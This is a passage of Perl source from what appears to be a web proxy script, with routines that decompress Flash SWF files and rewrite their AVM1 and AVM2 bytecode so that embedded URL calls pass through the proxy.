		  + vec($in_bitbuf, v($bitpos+1), 1)*8
		  + vec($in_bitbuf, v($bitpos+2), 1)*4
		  + vec($in_bitbuf, v($bitpos+3), 1)*2
		  + vec($in_bitbuf, v($bitpos+4), 1)*1 ;
	$bitpos+= 5 ;
	my($nbytes)= ($nbits*2-(length($in_bitbuf)*8-$bitpos)+7)>>3 ;
	$in_bitbuf.= substr($$in, pos($$in), $nbytes) ;
	pos($$in)+= $nbytes ;
	$bitpos+= $nbits*2 ;
    } else {
	$bitpos++ ;
    }

    # Next 5 bits contain field length
    if ($bitpos+5>8*length($in_bitbuf)) {
	$in_bitbuf.= substr($$in, pos($$in), 1) ;
	pos($$in)++ ;
    }
    my($nbits)= vec($in_bitbuf, v($bitpos), 1)  *16
	      + vec($in_bitbuf, v($bitpos+1), 1)*8
	      + vec($in_bitbuf, v($bitpos+2), 1)*4
	      + vec($in_bitbuf, v($bitpos+3), 1)*2
	      + vec($in_bitbuf, v($bitpos+4), 1)*1 ;
    $bitpos+= 5 ;
    my($nbytes)= ($nbits*2-(length($in_bitbuf)*8-$bitpos)+7)>>3 ;
    $in_bitbuf.= substr($$in, pos($$in), $nbytes) ;
    pos($$in)+= $nbytes ;

    return $in_bitbuf ;


    # Map bit positions into vec() offsets, i.e. reverse positions within byte.
    sub v {
	my($vec)= @_ ;
	return (($vec>>3)<<3) + 7-($vec & 7) ;
    }
}


sub get_swf_header_and_tags {
    my($in)= @_ ;

    # Grab initial, non-compressed 8 bytes from $in
    my($header_start)= substr($in, 0, 8) ;
    my($sig_byte, $swf_version, $swf_length)=
	$header_start=~ /^([CFZ])WS(.)(....)$/s ;
    return undef unless $sig_byte ;
    $swf_version= ord($swf_version) ;
    $swf_length= unpack('V', $swf_length) ;


    # Decompress remainder of input if needed.
    if ($sig_byte eq 'C') {
	substr($in, 0, 8)= '' ;

	eval { require IO::Uncompress::Inflate } ;
	&no_gzip_die if $@ ;
	my $zout ;
	no warnings qw(once) ;
	IO::Uncompress::Inflate::inflate(\$in, \$zout)
	    or &HTMLdie(["Couldn't inflate: %s", $IO::Uncompress::Inflate::InflateError]) ;
	$in= $zout ;

	&HTMLdie(["SWF length of %s is not expected %s", (length($in)+8), $swf_length])
	    unless $swf_length==(length($in)+8) ;


    } elsif ($sig_byte eq 'Z') {
	# Thanks very much to Paul Marquess for help with the LMZA decoding
	#   of SWF files.
	my $swf_compressed_length= unpack('V', substr($in, 8, 4)) ;
	my $lzma_properties= substr($in, 12, 5) ;
	substr($in, 0, 17)= '' ;

	eval { require IO::Uncompress::UnLzma ; require Compress::Raw::Lzma ; } ;
	&no_gzip_die if $@ ;

	my($inflater, $lzma_status)=
	    Compress::Raw::Lzma::RawDecoder->new(AppendOutput => 1,
						 Properties => $lzma_properties,
						 ConsumeInput => 0) ;
	&HTMLdie("Can't Compress::Raw::Lzma::RawDecoder->new(): $lzma_status")
	    unless $lzma_status==Compress::Raw::Lzma::LZMA_OK() ;

	my $zout ;
	do {
	    $lzma_status= $inflater->code($in, $zout) ;
	} until $lzma_status!=Compress::Raw::Lzma::LZMA_OK() ;

	&HTMLdie("Problem with LZMA stream: $lzma_status")
	    unless $lzma_status==Compress::Raw::Lzma::LZMA_STREAM_END() ;

	$in= $zout ;

	&HTMLdie(["SWF length of %s is not expected %s", length($in), $swf_length])
	    unless $swf_length==length($in) ;


    } else {
	&HTMLdie(["SWF length of %s is not expected %s", (length($in)+8), $swf_length])
	    unless $swf_length==(length($in)+8) ;
    }


    # Calculate length of FrameSize (RECT structure) in header
    my($nbits)= ord($in)>>3 ;
    my($totalbits)= (5+$nbits*4) ;
    my($nbytes)= ($totalbits + 7)>>3 ;

    # Grab final parts of SWF header
    my($header_end)= substr($in, 0, $nbytes+4) ;
    substr($in, 0, $nbytes+4)= '' ;

    return ($swf_version, $header_start, $header_end, $in) ;
}



# Get and proxify a CLIPACTIONS record from the input buffer.
sub get_clip_actions {
    my($in, $swf_version)= @_ ;
    my($eventflags_re)= ($swf_version<=5)  ? (qr/\G(..)/s)  : (qr/\G(....)/s) ;
    my(@out) ;

    $$in=~ /\G\0\0/gc  or die "ERROR: didn't get clipaction header\n" ;
    $$in=~ /$eventflags_re/gc ;         # AllEventFlags field
    push(@out, "\0\0", $1) ;
    while ($$in=~ /$eventflags_re/gc) {
	my($event_flags)= $1 ;      # EventFlags field
	push(@out, $event_flags) ;
	last if $event_flags eq "\0\0" or $event_flags eq "\0\0\0\0" ;
	$$in=~ /\G(....)/gcs ;
	my($action_record_size)= unpack('V', $1) ;

	# If ClipEventKeyPress event is set, then process KeyCode
	my($key_code) ;
	if ($swf_version>=6 and ord(substr($event_flags, 2, 1)) & 2) {
	    $$in=~ /\G(.)/gcs ;
	    $key_code= $1 ;
	}
	my($actions)= &proxify_swf_action_list($in, $action_record_size) ;
	$action_record_size= pack('V', length($key_code)+length($actions)) ;
	push(@out, $action_record_size, $key_code, $actions) ;
    }

    return join('', @out) ;
}



# Given an input buffer, read an action list, proxify it, and return it.
sub proxify_swf_action_list {
    my($in, $action_record_size)= @_ ;
    my(@out, $out_bytes, $out, $action, $needs_swflib, @jumps, @insertions, @code_blocks) ;

    my($insert_proxify_top_url)= "\x96\$\0\cG\0\0\0\0\0_proxy_swflib_proxify_top_url\0=" ;
    my($insert_proxify_top_url_len)= length($insert_proxify_top_url) ;
    my($insert_proxify_2nd_url)= "\x96\$\0\cG\0\0\0\0\0_proxy_swflib_proxify_2nd_url\0=" ;
    my($insert_proxify_2nd_url_len)= length($insert_proxify_2nd_url) ;
    my($insert_pre_method)= "\x96\x1f\0\cG\0\0\0\0\0_proxy_swflib_pre_method\0=" ;
    my($insert_pre_method_len)= length($insert_pre_method) ;
    my($insert_pre_function)= "\x96!\0\cG\0\0\0\0\0_proxy_swflib_pre_function\0=" ;
    my($insert_pre_function_len)= length($insert_pre_function) ;

    my($start_pos)= pos($$in) ;

    while ($$in=~ /\G(.)/gcs) {
	my($action_code)= ord($1) ;
	last if $action_code==0 ;
	my($action_length, $action_content) ;
	if ($action_code>=0x80) {
	    $$in=~ /\G(..)/gcs ;
	    $action_length= unpack('v', $1) ;
	    $action_content=
		substr($$in, pos($$in), $action_length) ;
	    pos($$in)+= $action_length ;
	}

	# ActionGetURL
	if ($action_code==0x83) {
	    $action_content=~ /\G(.*?)(\0.*)$/gcs ;
	    my($action_URL, $action_rest)= ($1, $2) ;
	    # Don't proxify "javascript:" URLs.
	    if ($action_URL!~ /^\s*(?:javascript|livescript)\b/i) {
		my($old_len)= length($action_content) ;
		$action_content= &full_url($action_URL) . $action_rest ;
		my($size_diff)= length($action_content) - $old_len ;
		&update_previous_jumps(\@jumps, $out_bytes, $size_diff) ;
		&update_previous_code_blocks(\@code_blocks, $out_bytes, $size_diff) ;
		push(@insertions, { 'location' => $out_bytes , 'size' => $size_diff } ) ;
	    }
	    $action= "\x83" . pack('v', length($action_content)) . $action_content ;

	# ActionGetURL2
	} elsif ($action_code==0x9a) {
	    $needs_swflib= 1 ;
	    &update_previous_jumps(\@jumps, $out_bytes, $insert_proxify_2nd_url_len) ;
	    &update_previous_code_blocks(\@code_blocks, $out_bytes, $insert_proxify_2nd_url_len) ;
	    push(@insertions, { 'location' => $out_bytes,
				'size' => $insert_proxify_2nd_url_len } ) ;
	    push(@out, $insert_proxify_2nd_url) ;
	    $out_bytes+= $insert_proxify_2nd_url_len ;
	    $action= "\x9a" . pack('v', length($action_content)) . $action_content ;

	# ActionCallMethod
	} elsif ($action_code==0x52) {
	    $needs_swflib= 1 ;
	    &update_previous_jumps(\@jumps, $out_bytes, $insert_pre_method_len) ;
	    &update_previous_code_blocks(\@code_blocks, $out_bytes, $insert_pre_method_len) ;
	    push(@insertions, { 'location' => $out_bytes,
				'size' => $insert_pre_method_len } ) ;
	    push(@out, $insert_pre_method) ;
	    $out_bytes+= $insert_pre_method_len ;
	    $action= "\x52" ;

	# ActionCallFunction
	} elsif ($action_code==0x3d) {
	    $needs_swflib= 1 ;
	    &update_previous_jumps(\@jumps, $out_bytes, $insert_pre_function_len) ;
	    &update_previous_code_blocks(\@code_blocks, $out_bytes, $insert_pre_function_len) ;
	    push(@insertions, { 'location' => $out_bytes,
				'size' => $insert_pre_function_len } ) ;
	    push(@out, $insert_pre_function) ;
	    $out_bytes+= $insert_pre_function_len ;
	    $action= "\x3d" ;

	# ActionJump and ActionIf
	} elsif ($action_code==0x99 or $action_code==0x9d) {
	    $action= chr($action_code) . "\x02\0\0\0" ;
	    # unpack little-endian unsigned short and convert to signed short
	    my($offset)= unpack('s', pack('S', unpack('v', $action_content))) ;
	    my($jump)= { 'location' => $out_bytes,
			 'target' => $out_bytes+$offset+5 } ;
	    &handle_previous_insertions(\@insertions, $jump) ;
	    push(@jumps, $jump) ;

	# ActionDefineFunction and ActionDefineFunction2
	} elsif ($action_code==0x9b or $action_code==0x8e) {
	    my($codesize_loc)= $out_bytes+3+$action_length-2 ;
	    my($codesize)= unpack('v', substr($action_content, -2)) ;
	    push(@code_blocks, { 'code_start' => $out_bytes+3+$action_length,
				 'codesize_loc' => $codesize_loc,
				 'codesize' => $codesize } ) ;
	    $action= chr($action_code) . pack('v', length($action_content)) . $action_content ;

	# ActionTry
	} elsif ($action_code==0x8f) {
	    $action_content=~ /\G(.)(......)/gcs ;
	    my($flags)= ord($1) ;
	    my($try_size, $catch_size, $finally_size)= unpack('vvv', $2) ;
	    my($catch_nr) ;
	    if ($flags & 4) {
		$action_content=~ /\G(.)/gcs ;
		$catch_nr= $1 ;
	    } else {
		$action_content=~ /\G(.*?\0)/gcs ;
		$catch_nr= $1 ;
	    }
	    push(@code_blocks, { 'code_start' => $out_bytes + $action_length,
				 'codesize_loc' => $out_bytes+4,
				 'codesize' => $try_size } ) ;
	    push(@code_blocks, { 'code_start' => $out_bytes + $action_length
						 + $try_size,
				 'codesize_loc' => $out_bytes+6,
				 'codesize' => $catch_size } ) ;
	    push(@code_blocks, { 'code_start' => $out_bytes + $action_length
						 + $try_size + $catch_size,
				 'codesize_loc' => $out_bytes+8,
				 'codesize' => $finally_size } ) ;
	    $action= "\x8f" . pack('v', length($action_content)) . $action_content ;


	# ActionWith
	# Note that we don't "handle" it other than updating the block size.
	} elsif ($action_code==0x94) {
	    my($codesize_loc)= $out_bytes+3 ;
	    my($codesize)= unpack('v', $action_content) ;
	    push(@code_blocks, { 'code_start' => $out_bytes+5,
				 'codesize_loc' => $codesize_loc,
				 'codesize' => $codesize } ) ;
	    $action= "\x94\x02\0" . $action_content ;


	} else {
	    $action= chr($action_code)
		   . (($action_code>=0x80)
		      ? (pack('v', length($action_content)) . $action_content)
		      : '') ;
	}

	push(@out, $action) ;
	$out_bytes+= length($action) ;
    }

    $out= join('', @out) ;

    die "ERROR: out_bytes not set correctly\n" if $out_bytes!=length($out) ; 
    die "ERROR: read wrong number of bytes (expected $action_record_size, got ".(pos($$in)-$start_pos).")\n"
	if defined($action_record_size) and pos($$in)-$start_pos!=$action_record_size ;

    &rewrite_jumps(\$out, \@jumps) ;
    &rewrite_codesizes(\$out, \@code_blocks) ;

    # For now, insert $swflib at start of every tag that needs it.  Can
    #   functions in one tag be called from functions in another?
    if ($needs_swflib) {
	$swflib||= &return_swflib() ;
	$out= $swflib . $out ;
    }

    return $out."\0" ;


    sub update_previous_jumps {
	my($jumps, $insert_pos, $offset)= @_ ;
	foreach (@$jumps) {
	    $_->{target}+= $offset  if $_->{target} > $insert_pos ;
	}
    }

    # Update codeSize fields in DefineFunction2 actions
    sub update_previous_code_blocks {
	my($code_blocks, $insert_pos, $offset)= @_ ;
	foreach (@$code_blocks) {
	    $_->{codesize}+= $offset
		if     ($_->{code_start} <= $insert_pos)
		    && ($_->{code_start}+$_->{codesize} > $insert_pos) ;
	}
    }

    # Update the current jump's target, based on previous insertions.
    sub handle_previous_insertions {
	my($insertions, $jump)= @_ ;
	foreach (reverse @$insertions) {
	    $jump->{target}-= $_->{size}
		if $_->{location}+$_->{size} >= $jump->{target} ;
	}
    }

    # Rewrite offsets of all jumps in @out.
    sub rewrite_jumps {
	my($out, $jumps)= @_ ;
	foreach (@$jumps) {
	    die "ERROR: jump is not a jump\n"
		if substr($$out, $_->{location}, 1)!~ /^[\x99\x9d]/ ;
	    # pack signed short back into little-endian unsigned short
	    substr($$out, $_->{location}+3, 2)=
		pack('v', unpack('S', pack('s', $_->{target} - $_->{location} - 5))) ;  # jump actions are 5 bytes
	}
    }

    # Rewrite codeSize fields in DefineFunction2 actions
    sub rewrite_codesizes {
	my($out, $code_blocks)= @_ ;
	foreach (@$code_blocks) {
	    substr($$out, $_->{codesize_loc}, 2)= pack('v', $_->{codesize}) ;
	}
    }

}

sub return_swflib {

    return "\x8e\x1f\0_proxy_swflib_alert_top\0\0\0\0*\x002\0L\x96\cY\0\0javascript:alert(\"top=[\0MG\x96\cE\0\0]\")\0G\x96\cB\0\0\0\x9a\cA\0\0>\x8e\$\0_proxy_swflib_set_classlists\0\0\0\0*\0\x7f\cB\x96\cF\0\0load\0\x96 \0\0XML\0\0LoadVars\0\0StyleSheet\0\cG\cC\0\0\0B\x96\cJ\0\0download\0\x96\cT\0\0FileReference\0\cG\cA\0\0\0B\x96\cH\0\0upload\0\x96\cT\0\0FileReference\0\cG\cA\0\0\0B\x96\cF\0\0send\0\x96\cT\0\0XML\0\0LoadVars\0\cG\cB\0\0\0B\x96\cM\0\0sendAndLoad\0\x96\cT\0\0XML\0\0LoadVars\0\cG\cB\0\0\0B\x96\cH\0\0getURL\0\x96\cP\0\0MovieClip\0\cG\cA\0\0\0B\x96\cK\0\0loadMovie\0\x96\cP\0\0MovieClip\0\cG\cA\0\0\0B\x96\cO\0\0loadVariables\0\x96\cP\0\0MovieClip\0\cG\cA\0\0\0B\x96\cJ\0\0loadClip\0\x96\cV\0\0MovieClipLoader\0\cG\cA\0\0\0B\x96\cI\0\0connect\0\x96\cT\0\0NetConnection\0\cG\cA\0\0\0B\x96\cF\0\0play\0\x96\cP\0\0NetStream\0\cG\cA\0\0\0B\x96\cP\0\0loadPolicyFile\0\x96\cO\0\0Security\0\cG\cA\0\0\0B\x96\cK\0\0loadSound\0\x96\cL\0\0Sound\0\cG\cA\0\0\0B\x96\cE\0\cG\cM\0\0\0C\x96\cZ\0\0_proxy_swflib_classlists\0M\x1d\x96\cJ\0\0getURL\0\cE\cA\x96\cM\0\0loadMovie\0\cE\cA\x96\cP\0\0loadMovieNum\0\cE\cA\x96\cQ\0\0loadVariables\0\cE\cA\x96\cT\0\0loadVariablesNum\0\cE\cA\x96\cE\0\cG\cE\0\0\0C\x96\x1c\0\0_proxy_swflib_functionlist\0M\x1d>\x96#\0\cG\0\0\0\0\0_proxy_swflib_set_classlists\0=\x8e \0_proxy_swflib_pre_method\0\0\0\0*\0\cO\cB\x96\x1b\0\0_proxy_swflib_method_name\0M\x1d\x96\cV\0\0_proxy_swflib_object\0M\x1d\x96\cZ\0\0_proxy_swflib_num_params\0M\x1d\x96\cZ\0\0_proxy_swflib_classlists\0\x1c\x96\x1b\0\0_proxy_swflib_method_name\0\x1cNL\x96\cA\0\cCI\x9d\cB\0\cS\cALD\x96\cJ\0\0function\0I\x9d\cB\0\xfe\0L\x96\cY\0\0_proxy_swflib_classlist\0M\x1d\x96\cH\0\0length\0NQ\x96\cQ\0\0_proxy_swflib_j\0M\x1d\x96\cV\0\0_proxy_swflib_object\0\x1c\x96\cY\0\0_proxy_swflib_classlist\0\x1c\x96\cQ\0\0_proxy_swflib_j\0\x1cN\x1cT\cR\x9d\cB\x000\0\x96\cE\0\cG\0\0\0\0\x96\x1f\0\0_proxy_swflib_proxify_top_url\0=\x99\cB\x008\0\x96\cQ\0\0_proxy_swflib_j\0L\x1cQ\x1d\x96\cQ\0\0_proxy_swflib_j\0\x1c\x9d\cB\0I\xff\x99\cB\0\cA\0\cW\x96\cZ\0\0_proxy_swflib_num_params\0\x1c\x96\cV\0\0_proxy_swflib_object\0\x1c\x96\x1b\0\0_proxy_swflib_method_name\0\x1c>\x8e\"\0_proxy_swflib_pre_function\0\0\0\0*\0\xf4\0\x96\x1d\0\0_proxy_swflib_function_name\0M\x1d\x96\cZ\0\0_proxy_swflib_num_params\0M\x1d\x96\x1c\0\0_proxy_swflib_functionlist\0\x1c\x96\x1d\0\0_proxy_swflib_function_name\0\x1cN\cR\x9d\cB\0+\0\x96\cE\0\cG\0\0\0\0\x96\x1f\0\0_proxy_swflib_proxify_top_url\0=\x96\cZ\0\0_proxy_swflib_num_params\0\x1c\x96\x1d\0\0_proxy_swflib_function_name\0\x1c>\x8e%\0_proxy_swflib_proxify_top_url\0\0\0\0*\0|\0L\x96\cA\0\cBI\x9d\cB\0p\0\x96\x1c\0\0_proxy_jslib_full_url\0\cG\cB\0\0\0\x96\cG\0\0flash\0\x1c\x96\cJ\0\0external\0N\x96\cS\0\0ExternalInterface\0N\x96\cF\0\0call\0RL\x96\cF\0\0null\0I\cR\x9d\cB\0\cF\0\cW\x96\cB\0\0\0>\x8e%\0_proxy_swflib_proxify_2nd_url\0\0\0\0*\0^\0\x96\cV\0\0_proxy_swflib_target\0M\x1d\x96\$\0\cG\0\0\0\0\0_proxy_swflib_proxify_top_url\0=\x96\cV\0\0_proxy_swflib_target\0\x1c>" ;

}


sub proxify_swf_abcFile {
    my($in, $record_length)= @_ ;

    # First, get fields of DoABC tag.
    $$in=~ /\G(....)(.*?\0)/gcs ;
    my($flags, $name)= ($1, $2) ;

    # Now, start the ABCData field.
    $$in=~ /\G(..)(..)/gcs ;
    my($major_ver, $minor_ver)= ($1, $2) ;

    my($cpool_info, $string_count, $ns_count, $multiname_count, $mn_specials)=
	&proxify_swf_cpool_info($in) ;
    my $method_infos= &get_swf_method_infos($in) ;
    my $metadata_infos= &get_swf_metadata_infos($in) ;
    my $instance_class_infos= &get_swf_instance_class_infos($in) ;
    my $script_infos= &get_swf_script_infos($in) ;
    my $method_body_infos=
	&proxify_swf_method_body_infos($in, $string_count, $ns_count, $multiname_count, $mn_specials) ;

    return join('', $flags, $name, $major_ver, $minor_ver,
		    $cpool_info, $method_infos, $metadata_infos, $instance_class_infos, $script_infos, $method_body_infos) ;
}

sub proxify_swf_cpool_info {
    my($in)= @_ ;
    my(@out, $s) ;
    my $n_specials= { connect => [], play => [], URLRequest => [], loaderURL => [],
		      loadPolicyFile => [], url => [], call => [], apply => [] } ;
    my $mn_specials= { connect => [], play => [], URLRequest => [], loaderURL => [],
		      loadPolicyFile => [], url => [], call => [], apply => [] } ;

    # get all constants, then just push substr($$in, ...) .
    # First, pass through initial parts that don't change.
    my $start_pos= pos($$in) ;
    my $int_count= &get_swf_u30_32($in) ;
    &skip_swf_u30_u32_s32($in)  foreach (1..$int_count-1) ;
    my $uint_count= &get_swf_u30_32($in) ;
    &skip_swf_u30_u32_s32($in)  foreach (1..$uint_count-1) ;
    my $double_count= &get_swf_u30_32($in) ;
    # Unmentioned in the spec, double_count can be 0.
    pos($$in)+= 8*($double_count-1) if $double_count ;
    push(@out, substr($$in, $start_pos, pos($$in)-$start_pos)) ;

    # Copy through strings, adding the 20 strings we need.
    my $string_count= &get_swf_u30_32($in) ;
    push(@out, &set_swf_u30_32($string_count+20)) ;
    $start_pos= pos($$in) ;
    foreach (1..$string_count-1) {
	$s= &get_swf_string($in) ;
	push(@{$n_specials->{$s}}, $_)  if defined $n_specials->{$s} ;
    }
    push(@out, substr($$in, $start_pos, pos($$in)-$start_pos)) ;
    push(@out, "\x09flash.net\x0aURLRequest\x03url\x0eflash.external\x11ExternalInterface\x15_proxy_jslib_full_url\x04call\0\x0dNetConnection\x09NetStream\x1d_proxy_jslib_full_url_connect\x1a_proxy_jslib_full_url_play\x09alert_obj\x1d_proxy_jslib_reverse_full_url\x0dflash.display\x0aLoaderInfo\x1f_proxy_jslib_proxify_js_array_0\x21_proxy_jslib_proxify_js_array_1_0\x21http://adobe.com/AS3/2006/builtin\x05shift") ;

    # Copy through namespace info, adding the 5 we need.
    my $ns_count= &get_swf_u30_32($in) ;
    push(@out, &set_swf_u30_32($ns_count+5)) ;
    $start_pos= pos($$in) ;
    pos($$in)++, &skip_swf_u30_u32_s32($in)  foreach (1..$ns_count-1) ;
    push(@out, substr($$in, $start_pos, pos($$in)-$start_pos)) ;
    push(@out, "\x16" . &set_swf_u30_32($string_count)       # flash.net
	     . "\x16" . &set_swf_u30_32($string_count+3)     # flash.external
	     . "\x16" . &set_swf_u30_32($string_count+7)     # ""
	     . "\x16" . &set_swf_u30_32($string_count+14)    # flash.display
	     . "\x08" . &set_swf_u30_32($string_count+18)) ; # http://adobe.com/AS3/2006/builtin


    # Namespace sets are unchanging.
    $start_pos= pos($$in) ;
    my $ns_set_count= &get_swf_u30_32($in) ;
    &get_swf_ns_set($in)  foreach (1..$ns_set_count-1) ;
    push(@out, substr($$in, $start_pos, pos($$in)-$start_pos)) ;

    # Copy through multinames, adding the 9 multinames we need.
    # Note that $string_count is the last string ID plus one.
    my $multiname_count= &get_swf_u30_32($in) ;
    push(@out, &set_swf_u30_32($multiname_count+9)) ;
    $start_pos= pos($$in) ;
    # Note that $mn_specials is modified in get_swf_multiname().
    &get_swf_multiname($in, $_, $n_specials, $mn_specials)  foreach (1..$multiname_count-1) ;
    push(@out, substr($$in, $start_pos, pos($$in)-$start_pos)) ;
    push(@out, "\x07" . &set_swf_u30_32($ns_count)             # flash.net
		      . &set_swf_u30_32($string_count+1)       # URLRequest
	     . "\x07" . &set_swf_u30_32($ns_count+2)           # ""
		      . &set_swf_u30_32($string_count+2)       # url
	     . "\x07" . &set_swf_u30_32($ns_count+1)           # flash.external
		      . &set_swf_u30_32($string_count+4)       # ExternalInterface
	     . "\x07" . &set_swf_u30_32($ns_count+2)           # ""
		      . &set_swf_u30_32($string_count+6)       # call
	     . "\x07" . &set_swf_u30_32($ns_count)             # flash.net
		      . &set_swf_u30_32($string_count+8)       # NetConnection
	     . "\x07" . &set_swf_u30_32($ns_count)             # flash.net
		      . &set_swf_u30_32($string_count+9)       # NetStream
	     . "\x07" . &set_swf_u30_32($ns_count+3)           # flash.display
		      . &set_swf_u30_32($string_count+15)      # LoaderInfo
	     . "\x11"                                          # (empty RTQNameL)
	     . "\x07" . &set_swf_u30_32($ns_count+4)           # http://adobe.com/AS3/2006/builtin
		      . &set_swf_u30_32($string_count+19)) ;   # shift

    return (join('', @out), $string_count, $ns_count, $multiname_count, $mn_specials) ;
}


sub get_swf_method_infos {
    my($in)= @_ ;
    my($param_count, $flags) ;

    my $start_pos= pos($$in) ;
    my $count= &get_swf_u30_32($in) ;
    for (1..$count) {
	$param_count= &get_swf_u30_32($in) ;
	&skip_swf_u30_u32_s32($in) ;
	&skip_swf_u30_u32_s32($in)  foreach (1..$param_count) ;
	&skip_swf_u30_u32_s32($in) ;
	$$in=~ /\G(.)/gcs  && ($flags= ord($1)) ;
	&get_swf_option_info($in)  if $flags & 0x08 ;
	if ($flags & 0x80) {
	    &skip_swf_u30_u32_s32($in)  foreach (1..$param_count) ;
	}
    }

    return substr($$in, $start_pos, pos($$in)-$start_pos) ;
}


sub get_swf_metadata_infos {
    my($in)= @_ ;
    my $start_pos= pos($$in) ;
    my $mi_count= &get_swf_u30_32($in) ;
    for (1..$mi_count) {
	&skip_swf_u30_u32_s32($in) ;
	my $item_count= &get_swf_u30_32($in) ;
	&skip_swf_u30_u32_s32($in)  for (1..2*$item_count) ;  # item_info is 2 u30's
    }

    return substr($$in, $start_pos, pos($$in)-$start_pos) ;
}


sub get_swf_instance_class_infos {
    my($in)= @_ ;
    my $start_pos= pos($$in) ;
    my($flags, $intrf_count, $trait_count) ;
    my $count= &get_swf_u30_32($in) ;
    for (1..$count) {       # instance_info
	&skip_swf_u30_u32_s32($in) ;
	&skip_swf_u30_u32_s32($in) ;
	$$in=~ /\G(.)/gcs  && ($flags= ord($1)) ;
	&skip_swf_u30_u32_s32($in)  if $flags & 0x08 ;
	$intrf_count= &get_swf_u30_32($in) ;
	&skip_swf_u30_u32_s32($in)  for (1..$intrf_count) ;
	&skip_swf_u30_u32_s32($in) ;
	$trait_count= &get_swf_u30_32($in) ;
	&get_swf_traits_info($in)  for (1..$trait_count) ;
    }
    for (1..$count) {       # class_info
	&skip_swf_u30_u32_s32($in) ;
	$trait_count= &get_swf_u30_32($in) ;
	&get_swf_traits_info($in)  for (1..$trait_count) ;
    }

    return substr($$in, $start_pos, pos($$in)-$start_pos) ;
}


sub get_swf_script_infos {
    my($in)= @_ ;
    my $start_pos= pos($$in) ;
    my($trait_count) ;
    my $count= &get_swf_u30_32($in) ;
    for (1..$count) {       # script_info
	&skip_swf_u30_u32_s32($in) ;
	$trait_count= &get_swf_u30_32($in) ;
	&get_swf_traits_info($in)  for (1..$trait_count) ;
    }

    return substr($$in, $start_pos, pos($$in)-$start_pos) ;
}


# Here is where the AVM2 bytecode is proxified.
sub proxify_swf_method_body_infos {
    my($in, $string_count, $ns_count, $multiname_count, $mn_specials)= @_ ;
    my(@out, $pos, $code_length, $code, $insertions, $pre_coerce_ins_part1, $pre_coerce_ins_part2,
       $exception_count, $trait_count) ;

    my $count= &get_swf_u30_32($in) ;
    push(@out, &set_swf_u30_32($count)) ;

    # These are what need to be inserted into the bytecode at various points.
    # Since length may vary, must calculate length of the code after the jump(s).
    my($post_construct_ins, $pre_connect_ins, $pre_play_ins, $post_loaderURL_ins,
       $replace_get_url_ins_format1, $replace_get_url_ins_format2, $proxify_top_url_ins,
       $after_jump, $after_jump2, $block, $pre_call_ins_format, $pre_call_ins_loop, $pre_apply_ins) ;

    my $alert_ins= "\x2a\x60" . &set_swf_u30_32($multiname_count+2)
		 . "\x2b\x2c" . &set_swf_u30_32($string_count+12)
		 . "\x2b\x46" . &set_swf_u30_32($multiname_count+3)
		 . "\x02\x29" ;

    $proxify_top_url_ins= "\x60" . &set_swf_u30_32($multiname_count+2)
		 . "\x2b\x2c" . &set_swf_u30_32($string_count+5)
		 . "\x2b\x46" . &set_swf_u30_32($multiname_count+3) . "\x02" ;


    $after_jump= "\x2a\x2a\x60" . &set_swf_u30_32($multiname_count+2)
	       . "\x2b\x2c" . &set_swf_u30_32($string_count+5)
	       . "\x2b\x66" . &set_swf_u30_32($multiname_count+1)
	       . "\x46" . &set_swf_u30_32($multiname_count+3)
	       . "\x02\x61" . &set_swf_u30_32($multiname_count+1) ;
    $post_construct_ins= "\x2a\xb2" . &set_swf_u30_32($multiname_count)
		       . "\x12" . &set_swf_s24(length($after_jump)) . $after_jump ;

    $after_jump= "\x2b\x60" . &set_swf_u30_32($multiname_count+2)
	       . "\x2b\x2c" . &set_swf_u30_32($string_count+10)
	       . "\x2b\x46" . &set_swf_u30_32($multiname_count+3) . "\x02" ;
    $pre_connect_ins= "\x2b\x2a\xb2" . &set_swf_u30_32($multiname_count+4)
		    . "\x11" . &set_swf_s24(5) . "\x2b\x10" . &set_swf_s24(length($after_jump)) . $after_jump ;

    $after_jump= "\x2b\x60" . &set_swf_u30_32($multiname_count+2)
	       . "\x2b\x2c" . &set_swf_u30_32($string_count+11)
	       . "\x2b\x46" . &set_swf_u30_32($multiname_count+3) . "\x02" ;
    $pre_play_ins= "\x2b\x2a\xb2" . &set_swf_u30_32($multiname_count+5)
		 . "\x11" . &set_swf_s24(5) . "\x2b\x10" . &set_swf_s24(length($after_jump)) . $after_jump ;

    $post_loaderURL_ins= "\x60" . &set_swf_u30_32($multiname_count+2)
		       . "\x2b\x2c" . &set_swf_u30_32($string_count+13)
		       . "\x2b\x46" . &set_swf_u30_32($multiname_count+3) . "\x02" ;


    # Used for getproperty something::url -- messy, since need to use original
    #   multiname, whose length is unpredictable.
    # First format string has three %s: (length of getproperty instruction)+4, $param_st,
    #   (length of $replace_get_url_ins_format2) .
    # Second format string has one %s, set to $param_st .
    $block= "\x2a\xb2" . &set_swf_u30_32($multiname_count+6) ;
    $block=~ s/%/%%/g ;   # since this will be used in sprintf()
    $replace_get_url_ins_format1= $block . "\x11%s\x66%s\x10%s" ;
    $block= "\x60" .  &set_swf_u30_32($multiname_count+2)
	  . "\x2b\x2c" . &set_swf_u30_32($string_count+13)
	  . "\x2b\x46" . &set_swf_u30_32($multiname_count+3) . "\x02" ;
    $block=~ s/%/%%/g ;   # since this will be used in sprintf()
    $replace_get_url_ins_format2= "\x66%s$block" ;     # this is now previous $after_jump, with %s for PARAM_ST


    # Calculate unchanging parts outside of loop.
    $pre_coerce_ins_part1= "\x2a\xb2" . &set_swf_u30_32($multiname_count)
			 . "\x11" ;
    $pre_coerce_ins_part2= "\x2a\x2a\x60" . &set_swf_u30_32($multiname_count+2)
			 . "\x2b\x2c" . &set_swf_u30_32($string_count+5)
			 . "\x2b\x66" . &set_swf_u30_32($multiname_count+1)
			 . "\x46" . &set_swf_u30_32($multiname_count+3)
			 . "\x02\x61" . &set_swf_u30_32($multiname_count+1)
			 . "\x10" ;

    # call is messy-- will use $pre_call_ins_format as a sprintf() format, and
    #   $pre_call_ins_loop will be inserted arg_count times at the second %s.
    $after_jump= "\x2b\x60" . &set_swf_u30_32($multiname_count+2)
	       . "\x2b\x2c" . &set_swf_u30_32($string_count+16)
	       . "\x2b\x46" . &set_swf_u30_32($multiname_count+3)
	       . "\x02\x2b" ;
    $pre_call_ins_format= "\x56%s" ;
    $block= "\x2b\x2a\x60" . &set_swf_u30_32($multiname_count+2)
	  . "\x14" . &set_swf_s24(length($after_jump)) . $after_jump
	  . "\x2b" ;
    $block=~ s/%/%%/g ;   # since this will be used in sprintf()
    $pre_call_ins_format.= "$block%s\x29" ;
    $pre_call_ins_loop= "\x2a\x46" . &set_swf_u30_32($multiname_count+8) . "\x00\x2b" ;


    $after_jump= "\x2b\x60" . &set_swf_u30_32($multiname_count+2)
